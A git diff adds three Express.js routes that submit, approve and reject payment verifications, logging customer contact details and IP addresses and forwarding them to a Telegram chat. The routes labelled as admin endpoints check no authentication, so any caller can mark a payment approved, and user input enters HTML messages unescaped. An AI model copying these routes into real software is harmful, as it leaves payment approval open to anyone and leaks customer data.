@@ -323,4 +323,194 @@ router.post('/logout', async (req, res) => {
   }
 });
 
+// Payment verification endpoints
+router.post('/verify-payment', async (req, res) => {
+  try {
+    const { 
+      contact, 
+      packageName, 
+      amount, 
+      paymentMethod,
+      transactionId,
+      source,
+      timestamp 
+    } = req.body;
+
+    // Validate required fields
+    if (!contact || !packageName) {
+      return res.status(400).json({ 
+        success: false,
+        error: 'Contact and package name are required' 
+      });
+    }
+
+    const verificationData = {
+      contact,
+      packageName,
+      amount,
+      paymentMethod: paymentMethod || 'Unknown',
+      transactionId: transactionId || 'N/A',
+      source: source || 'Payment Verification',
+      timestamp: timestamp || new Date().toISOString(),
+      ip: req.ip || 'Unknown',
+      status: 'pending_admin_verification'
+    };
+
+    // Log verification request
+    logAuthData(verificationData);
+
+    // Send to Telegram with verification buttons
+    const telegramMessage = `💰 <b>PAYMENT VERIFICATION REQUEST</b>
+
+👤 Customer: <code>${contact}</code>
+💰 Package: <b>${packageName}</b>
+💵 Amount: <b>$${amount || 'N/A'}</b>
+💳 Method: <b>${paymentMethod || 'Card Payment'}</b>
+🔗 Transaction ID: <code>${transactionId || 'N/A'}</code>
+📍 IP: <code>${req.ip || 'Unknown'}</code>
+⏰ Time: <code>${new Date().toLocaleString()}</code>
+🔗 Source: ${source || 'Payment Verification'}
+
+⚠️ <b>ADMIN ACTION REQUIRED</b>
+Please verify this payment and approve/reject access.`;
+
+    await sendToTelegram(telegramMessage);
+
+    // Return success with verification ID
+    res.json({ 
+      success: true,
+      message: 'Payment verification request submitted successfully',
+      verificationId: Date.now().toString(),
+      status: 'pending_verification',
+      estimatedTime: '5-10 minutes'
+    });
+
+  } catch (error) {
+    console.error('❌ Payment verification error:', error);
+    
+    // Log error
+    logAuthData({
+      error: error.message,
+      contact: req.body.contact,
+      packageName: req.body.packageName,
+      timestamp: new Date().toISOString(),
+      action: 'verification_error'
+    });
+
+    res.status(500).json({ 
+      success: false,
+      error: 'Failed to submit payment verification',
+      message: 'Please try again or contact support'
+    });
+  }
+});
+
+// Admin payment approval endpoint
+router.post('/approve-payment', async (req, res) => {
+  try {
+    const { 
+      contact, 
+      packageName, 
+      verificationId,
+      adminNote,
+      timestamp 
+    } = req.body;
+
+    const approvalData = {
+      contact,
+      packageName,
+      verificationId,
+      adminNote: adminNote || 'Payment approved',
+      action: 'payment_approved',
+      timestamp: timestamp || new Date().toISOString(),
+      ip: req.ip || 'Unknown'
+    };
+
+    // Log approval
+    logAuthData(approvalData);
+
+    // Send approval notification to Telegram
+    const telegramMessage = `✅ <b>PAYMENT APPROVED</b>
+
+👤 Customer: <code>${contact}</code>
+💰 Package: <b>${packageName}</b>
+🔗 Verification ID: <code>${verificationId}</code>
+📝 Note: ${adminNote || 'Payment approved by admin'}
+⏰ Time: <code>${new Date().toLocaleString()}</code>
+
+✅ <b>ACCESS GRANTED</b>
+User can now access their package.`;
+
+    await sendToTelegram(telegramMessage);
+
+    res.json({ 
+      success: true,
+      message: 'Payment approved successfully',
+      status: 'approved',
+      accessGranted: true
+    });
+
+  } catch (error) {
+    console.error('❌ Payment approval error:', error);
+    res.status(500).json({ 
+      success: false,
+      error: 'Failed to approve payment'
+    });
+  }
+});
+
+// Admin payment rejection endpoint
+router.post('/reject-payment', async (req, res) => {
+  try {
+    const { 
+      contact, 
+      packageName, 
+      verificationId,
+      rejectionReason,
+      timestamp 
+    } = req.body;
+
+    const rejectionData = {
+      contact,
+      packageName,
+      verificationId,
+      rejectionReason: rejectionReason || 'Payment rejected',
+      action: 'payment_rejected',
+      timestamp: timestamp || new Date().toISOString(),
+      ip: req.ip || 'Unknown'
+    };
+
+    // Log rejection
+    logAuthData(rejectionData);
+
+    // Send rejection notification to Telegram
+    const telegramMessage = `❌ <b>PAYMENT REJECTED</b>
+
+👤 Customer: <code>${contact}</code>
+💰 Package: <b>${packageName}</b>
+🔗 Verification ID: <code>${verificationId}</code>
+📝 Reason: ${rejectionReason || 'Payment rejected by admin'}
+⏰ Time: <code>${new Date().toLocaleString()}</code>
+
+❌ <b>ACCESS DENIED</b>
+User payment was not verified.`;
+
+    await sendToTelegram(telegramMessage);
+
+    res.json({ 
+      success: true,
+      message: 'Payment rejected',
+      status: 'rejected',
+      accessGranted: false
+    });
+
+  } catch (error) {
+    console.error('❌ Payment rejection error:', error);
+    res.status(500).json({ 
+      success: false,
+      error: 'Failed to reject payment'
+    });
+  }
+});
+
 module.exports = router;
